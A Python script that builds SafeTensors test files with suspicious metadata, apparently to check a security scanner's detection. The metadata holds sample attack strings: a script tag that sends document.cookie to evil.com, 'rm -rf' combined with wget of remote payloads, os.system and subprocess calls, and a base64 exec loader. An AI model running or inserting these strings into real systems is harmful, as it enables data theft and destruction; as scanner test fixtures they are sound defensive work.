#!/usr/bin/env python3
"""
Generate SafeTensors test assets for security testing.

This script creates SafeTensors files with various types of suspicious metadata
to test the enhanced detection capabilities of the SafeTensorsScanner.
"""

from pathlib import Path
from typing import Any

import numpy as np
from safetensors.numpy import save_file


def generate_safetensors_assets() -> None:
    """Generate SafeTensors test assets with suspicious metadata."""
    assets_dir = Path(__file__).parent.parent / "samples" / "safetensors"
    assets_dir.mkdir(exist_ok=True)

    print("🔒 Generating SafeTensors security test assets...")

    # Base tensor data for all tests
    base_data = {
        "embeddings": np.random.randn(100, 768).astype(np.float32),
        "weights": np.random.randn(768, 256).astype(np.float32),
        "bias": np.zeros(256, dtype=np.float32),
    }

    # Test cases with suspicious metadata
    test_cases: list[dict[str, Any]] = [
        {
            "filename": "malicious_import.safetensors",
            "metadata": {
                "model_info": "import os; os.system('echo pwned')",
                "description": "Legitimate looking model with malicious import statement",
            },
            "description": "SafeTensors with import statement in metadata",
        },
        {
            "filename": "suspicious_url.safetensors",
            "metadata": {
                "download_url": "https://malicious.example.com/payload",
                "callback_url": "http://evil.com/exfiltrate",
                "author": "ML Team",
            },
            "description": "SafeTensors with suspicious URLs in metadata",
        },
        {
            "filename": "shell_commands.safetensors",
            "metadata": {
                "setup_commands": "rm -rf /tmp/test && wget http://bad.com/script.sh",
                "cleanup": "chmod 777 /tmp/malicious",
                "version": "1.0.0",
            },
            "description": "SafeTensors with shell commands in metadata",
        },
        {
            "filename": "script_injection.safetensors",
            "metadata": {
                "documentation": "<script>fetch('http://evil.com', {method: 'POST', body: document.cookie})</script>",
                "html_description": "<script>alert('XSS')</script>",
                "model_type": "transformer",
            },
            "description": "SafeTensors with script injection in metadata",
        },
        {
            "filename": "multiple_patterns.safetensors",
            "metadata": {
                "init_code": "import subprocess; subprocess.call(['curl', 'http://evil.com'])",
                "config_url": "https://attacker.com/config.json",
                "cleanup_script": "<script>document.location='http://phishing.com'</script>",
                "shell_hook": "rm -rf * && wget http://malware.com/payload",
            },
            "description": "SafeTensors with multiple suspicious patterns",
        },
        {
            "filename": "obfuscated_metadata.safetensors",
            "metadata": {
                "encoded_payload": "import base64; exec(base64.b64decode('cHJpbnQoImV2aWwiKQ=='))",
                "hex_data": "\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64",
                "description": "Model with encoded malicious content",
            },
            "description": "SafeTensors with obfuscated/encoded suspicious content",
        },
    ]

    # Generate safe model for comparison
    safe_metadata: dict[str, str] = {
        "model_name": "transformer-small",
        "author": "Safe ML Team",
        "version": "1.2.3",
        "description": "A small transformer model for text classification",
        "license": "MIT",
        "training_dataset": "safe-corpus-v1",
        "accuracy": "94.5%",
        "parameters": "12M",
    }

    safe_path = assets_dir / "safe_model.safetensors"
    save_file(base_data, str(safe_path), metadata=safe_metadata)
    print(f"✅ Generated: {safe_path.name} (safe baseline)")

    # Generate suspicious models
    for test_case in test_cases:
        file_path = assets_dir / test_case["filename"]
        save_file(base_data, str(file_path), metadata=test_case["metadata"])
        print(f"🚨 Generated: {test_case['filename']} - {test_case['description']}")

    print(f"\n📁 SafeTensors assets location: {assets_dir}")
    print("✅ SafeTensors security test assets generated successfully!")


if __name__ == "__main__":
    generate_safetensors_assets()
